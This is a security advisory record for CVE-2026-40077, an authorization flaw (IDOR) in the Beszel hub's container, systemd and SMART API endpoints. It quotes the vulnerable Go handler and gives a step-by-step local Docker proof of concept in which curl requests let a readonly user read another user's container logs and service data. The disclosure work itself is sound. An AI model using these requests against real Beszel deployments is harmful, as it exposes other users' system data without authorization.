@@ -1,0 +1,278 @@
+advisory_id: GHSA-5f5r-95pg-xrpm
+datasource_id: github_osv/GHSA-5f5r-95pg-xrpm
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-5f5r-95pg-xrpm/GHSA-5f5r-95pg-xrpm.json
+aliases:
+  - CVE-2026-40077
+summary: |
+  Beszel has an IDOR in hub API endpoints that read system ID from URL parameter
+  ## Summary
+  Some API endpoints in the Beszel hub accept a user-supplied system ID and proceed without further checks that the user should have access to that system. As a result, any authenticated user can access these routes for any system if they know the system's ID.
+
+  System IDs are random 15 character alphanumeric strings, and are not exposed to all users. However, it is theoretically possible for an authenticated user to enumerate a valid system ID via web API. To use the `containers` endpoints, the user would also need to enumerate a container ID, which is 12 digit hexadecimal string.
+
+  ## Affected Component
+
+  - **File:** `internal/hub/api.go`, lines 283–361
+  - **Endpoints:**
+    - `GET /api/beszel/containers/logs?system=SYSTEM_ID&container=CONTAINER_ID`
+    - `GET /api/beszel/containers/info?system=SYSTEM_ID&container=CONTAINER_ID`
+    - `GET /api/beszel/systemd/info?system=SYSTEM_ID&service=SERVICE_NAME`
+    - `POST /api/beszel/smart/refresh?system=SYSTEM_ID`
+  - **Commit:** c7261b56f1bfb9ae57ef0856a0052cabb2fd3b84
+
+  ## Vulnerable Code
+
+  The `containerRequestHandler` function retrieves a system by ID but never verifies the authenticated user is a member of that system:
+
+  ```go
+  // internal/hub/api.go:283-305
+  func (h *Hub) containerRequestHandler(e *core.RequestEvent, fetchFunc func(*systems.System, string) (string, error), responseKey string) error {
+      systemID := e.Request.URL.Query().Get("system")
+      containerID := e.Request.URL.Query().Get("container")
+
+      if systemID == "" || containerID == "" {
+          return e.JSON(http.StatusBadRequest, map[string]string{"error": "system and container parameters are required"})
+      }
+      if !containerIDPattern.MatchString(containerID) {
+          return e.JSON(http.StatusBadRequest, map[string]string{"error": "invalid container parameter"})
+      }
+
+      system, err := h.sm.GetSystem(systemID)
+      // ^^^ No authorization check: e.Auth.Id is never verified against system.users
+      if err != nil {
+          return e.JSON(http.StatusNotFound, map[string]string{"error": "system not found"})
+      }
+
+      data, err := fetchFunc(system, containerID)
+      if err != nil {
+          return e.JSON(http.StatusNotFound, map[string]string{"error": err.Error()})
+      }
+
+      return e.JSON(http.StatusOK, map[string]string{responseKey: data})
+  }
+  ```
+
+  The same pattern applies to `getSystemdInfo` (lines 322–340) and `refreshSmartData` (lines 342–361).
+
+  Meanwhile, the standard PocketBase collection API enforces proper membership checks:
+
+  ```go
+  // internal/hub/collections.go:56-57
+  systemsMemberRule := authenticatedRule + " && users.id ?= @request.auth.id"
+  systemMemberRule  := authenticatedRule + " && system.users.id ?= @request.auth.id"
+  ```
+
+  These rules are only applied to the PocketBase collection endpoints, **not** to the custom routes registered on `apiAuth`.
+
+  ### PoC
+  **The proof:** The standard PocketBase API returns `404` (system not found) for unassigned systems. The custom endpoints resolve the system, contact the agent, and return data — proving the authorization check is missing.
+
+  #### Step 1: Start the hub
+
+  ```bash
+  cd ~/Evidence/henrygd/beszel/finding418/docker-poc/
+  docker compose up -d
+  ```
+
+  Wait a few seconds, then verify:
+
+  ```bash
+  curl -s http://localhost:8090/api/health
+  ```
+
+  Expected: `{"message":"API is healthy.","code":200,"data":{}}`
+
+  #### Step 2: Create User A (admin)
+
+  Open `http://localhost:8090` in a browser and create the first user:
+
+  - Email: `usera@test.com`
+  - Password: `testpassword1`
+
+  #### Step 3: Create User B (readonly)
+
+  In the Beszel UI, go to Users and add a new user:
+
+  - Email: `userb@test.com`
+  - Password: `testpassword2`
+  - Role: **readonly**
+
+  #### Step 4: Authenticate as User A
+
+  ```bash
+  TOKEN_A=$(curl -s http://localhost:8090/api/collections/users/auth-with-password \
+    -H "Content-Type: application/json" \
+    -d '{"identity":"usera@test.com","password":"testpassword1"}' \
+    | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+
+  echo "TOKEN_A=$TOKEN_A"
+  ```
+
+  #### Step 5: Get hub public key
+
+  ```bash
+  HUB_KEY=$(curl -s http://localhost:8090/api/beszel/getkey \
+    -H "Authorization: $TOKEN_A" \
+    | python3 -c "import sys,json; print(json.load(sys.stdin)['key'])")
+
+  echo "HUB_KEY=$HUB_KEY"
+  ```
+
+  #### Step 6: Create a universal token and start the agent
+
+  ```bash
+  UTOK_A=$(curl -s "http://localhost:8090/api/beszel/universal-token?enable=1" \
+    -H "Authorization: $TOKEN_A" \
+    | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+
+  echo "UTOK_A=$UTOK_A"
+  ```
+
+  Find the Docker network the hub is on:
+
+  ```bash
+  NETWORK=$(docker inspect beszel-hub --format '{{range $k,$v := .NetworkSettings.Networks}}{{$k}}{{end}}')
+  echo "Network: $NETWORK"
+  ```
+
+  Start the agent on the **same network** so the hub can reach it:
+
+  ```bash
+  docker run -d --name beszel-agent-a \
+    --network "$NETWORK" \
+    -e HUB_URL=http://beszel-hub:8090 \
+    -e TOKEN="$UTOK_A" \
+    -e KEY="$HUB_KEY" \
+    henrygd/beszel-agent:latest
+  ```
+
+  Wait a few seconds for the agent to register:
+
+  ```bash
+  sleep 5
+  ```
+
+  #### Step 7: Verify User A sees the system
+
+  ```bash
+  curl -s http://localhost:8090/api/collections/systems/records \
+    -H "Authorization: $TOKEN_A" | python3 -m json.tool
+  ```
+
+  You should see one system in `items`. Save the system ID:
+
+  ```bash
+  SYSTEM_A_ID=$(curl -s http://localhost:8090/api/collections/systems/records \
+    -H "Authorization: $TOKEN_A" \
+    | python3 -c "import sys,json; print(json.load(sys.stdin)['items'][0]['id'])")
+
+  echo "SYSTEM_A_ID=$SYSTEM_A_ID"
+  ```
+
+  #### Step 8: Authenticate as User B (readonly)
+
+  ```bash
+  TOKEN_B=$(curl -s http://localhost:8090/api/collections/users/auth-with-password \
+    -H "Content-Type: application/json" \
+    -d '{"identity":"userb@test.com","password":"testpassword2"}' \
+    | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+
+  echo "TOKEN_B=$TOKEN_B"
+  ```
+
+  Verify User B sees NO systems:
+
+  ```bash
+  curl -s http://localhost:8090/api/collections/systems/records \
+    -H "Authorization: $TOKEN_B" | python3 -m json.tool
+  ```
+
+  Expected: `"totalItems": 0`
+
+  #### Step 9: Control test — standard API blocks User B
+
+  ```bash
+  echo "=== Standard PocketBase API ==="
+  curl -s -w "\nHTTP Status: %{http_code}\n" \
+    "http://localhost:8090/api/collections/systems/records/$SYSTEM_A_ID" \
+    -H "Authorization: $TOKEN_B"
+  ```
+
+  Expected: **404** — RBAC correctly hides the system from User B.
+
+  #### Step 10: IDOR — SMART refresh (User B triggers action on User A's system)
+
+  ```bash
+  echo "=== IDOR: POST /api/beszel/smart/refresh ==="
+  curl -s "http://localhost:8090/api/beszel/smart/refresh?system=$SYSTEM_A_ID" \
+    -X POST -H "Authorization: $TOKEN_B" | python3 -m json.tool
+  ```
+
+  Expected: The hub processes the request and contacts the agent. Any response (data or agent error) proves the IDOR — compare with the 404 from Step 9.
+
+  #### Step 11: IDOR — Systemd info (User B reads from User A's system)
+
+  ```bash
+  echo "=== IDOR: GET /api/beszel/systemd/info ==="
+  curl -s "http://localhost:8090/api/beszel/systemd/info?system=$SYSTEM_A_ID&service=sshd" \
+    -H "Authorization: $TOKEN_B" | python3 -m json.tool
+  ```
+
+  Expected: Hub contacts the agent and returns systemd data or an agent-level error.
+
+  #### Step 12: IDOR — Container logs (User B reads from User A's system)
+
+  Container endpoints require a Docker container ID (12-64 hex chars). Get a real one from the agent's host:
+
+  ```bash
+  # Get a real container ID from Docker (first 12 hex chars)
+  CONTAINER_ID=$(docker ps --format '{{.ID}}' | head -1)
+  echo "CONTAINER_ID=$CONTAINER_ID"
+
+  echo "=== IDOR: GET /api/beszel/containers/logs ==="
+  curl -s "http://localhost:8090/api/beszel/containers/logs?system=$SYSTEM_A_ID&container=$CONTAINER_ID" \
+    -H "Authorization: $TOKEN_B" | python3 -m json.tool
+  ```
+
+  #### Step 13: IDOR — Container info (User B reads from User A's system)
+
+  ```bash
+  echo "=== IDOR: GET /api/beszel/containers/info ==="
+  curl -s "http://localhost:8090/api/beszel/containers/info?system=$SYSTEM_A_ID&container=$CONTAINER_ID" \
+    -H "Authorization: $TOKEN_B" | python3 -m json.tool
+  ```
+
+  ### Impact
+
+  - **Container logs**: Content of recent application logs, potentially including sensitive information
+  - **Container info**: Content of Docker engine API's `/containers/{id}/json` endpoint, excluding environment variables
+  - **Systemd info**: Unit properties and status for any monitored service
+  - **SMART refresh**: Trigger a SMART data update on any system
+impacted_packages: []
+severities:
+  - score: '3.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:L/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-5f5r-95pg-xrpm/GHSA-5f5r-95pg-xrpm.json
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-184
+references:
+  - url: https://github.com/henrygd/beszel
+    reference_type:
+    reference_id:
+  - url: https://github.com/henrygd/beszel/releases/tag/v0.18.7
+    reference_type:
+    reference_id:
+  - url: https://github.com/henrygd/beszel/security/advisories/GHSA-5f5r-95pg-xrpm
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-40077
+    reference_type:
+    reference_id:
+exploits: []
